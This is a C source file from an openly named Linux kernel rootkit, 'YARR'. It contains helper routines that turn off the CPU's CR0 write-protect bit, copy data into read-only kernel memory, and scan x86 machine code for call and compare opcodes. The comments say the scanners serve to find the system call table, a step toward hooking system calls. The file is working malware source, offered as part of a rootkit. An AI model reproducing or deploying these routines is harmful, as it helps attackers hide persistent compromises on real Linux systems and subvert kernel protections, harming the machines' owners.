/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/sched.h>

#include "funcs.h"
#include "debug.h"

#define WP_BIT (0x00010000)

/***
 * Disables the WP (Write Protect) bit of the CR0 register.
 */
void cr0_disable_wp(void) {
	write_cr0(read_cr0() & ~WP_BIT);
}

/***
 * Enables the WP (Write Protect) bit of the CR0 register.
 */
void cr0_enable_wp(void) {
	write_cr0(read_cr0() | WP_BIT);
}

/***
 * Tells whether the WP bit is enabled or not at CR0 register.
 *
 * @return: Zero if WP is disabled and non-zero if it is set.
 */
int cr0_wp_is_enabled(void) {
	return read_cr0() & WP_BIT;
}

void *kmemcpy(void *dst, void *orig, size_t len) {
	void *res;

	if (cr0_wp_is_enabled()) {
		cr0_disable_wp();
		res = memcpy(dst, orig, len);
		cr0_enable_wp();
	}
	else
		res = memcpy(dst, orig, len);

	return res;
}

void *search_call_opcode(void *code) {
	// TODO: Hardware-dependant (x86 32 bits).
	// \xff\x14\x85 is the opcode of a call instruction on x86 systems... this
	// is not totally true, in fact it is the opcode of the instruction
	// call *<address>(,%eax,4).
	while ((*(u32 *)(code++) & 0x00FFFFFF ) != 0x008514ff);
	return --code;
}

void *search_cmpl_opcode(void *code) {
	// TODO: Hardware dependant. Also note that this is an infinite loop, so
	// care where you use it (it was implemented having in mind just use this
	// to search for sys_call_table size).
	while (*(u8 *)(code++) != '\x3d');
	return --code;
}

